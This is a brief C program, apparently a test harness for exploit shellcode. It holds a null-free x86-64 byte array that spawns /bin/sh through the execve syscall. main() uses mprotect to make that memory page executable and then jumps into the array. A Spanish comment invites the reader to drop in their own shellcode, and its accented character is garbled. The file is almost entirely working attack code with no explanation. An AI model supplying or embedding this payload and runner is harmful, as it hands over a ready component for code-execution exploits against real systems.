#include <sys/mman.h>

 enum{
     Pagesz = 4*1024,
 };

char code[] = {
    // Aqu√≠ va tu shellcode como un array de chars
  0x48, 0xc7, 0xc0, 0x3b, 0xff, 0xff, 0xff, 0xc1, 0xe0, 0x38,
  0xc1, 0xe8, 0x38, 0x49, 0xbc, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
  0x73, 0x68, 0xff, 0x49, 0xc1, 0xe4, 0x08, 0x49, 0xc1, 0xec,
  0x08, 0x41, 0x54, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xdb, 0x48,
  0x89, 0xde, 0x48, 0x89, 0xda, 0x0f, 0x05

};

int
main(int argc, char** argv)
{
    int (*f)() = (int(*)())code;
    void *addr =  (void*)((unsigned long long)f / Pagesz * Pagesz);
    mprotect(addr, Pagesz, PROT_READ|PROT_WRITE|PROT_EXEC);
    f();
}
